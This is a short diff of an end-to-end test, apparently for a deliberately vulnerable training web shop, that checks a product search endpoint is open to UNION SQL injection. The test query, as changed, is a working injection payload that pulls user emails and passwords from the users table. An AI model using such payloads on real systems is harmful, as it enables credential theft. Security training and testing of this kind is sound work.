@@ -33,7 +33,7 @@ describe('/#/search', () => {
 describe('/rest/products/search', () => {
   describe('challenge "unionSqlInjection"', () => {
     it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
-      browser.driver.get(`${browser.baseUrl}/rest/products/search?q=')) union select id,email,password,'4','5','6','7','8','9' from users--`)
+      browser.driver.get(`${browser.baseUrl}/rest/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--`)
     })
 
     protractor.expect.challengeSolved({ challenge: 'User Credentials' })
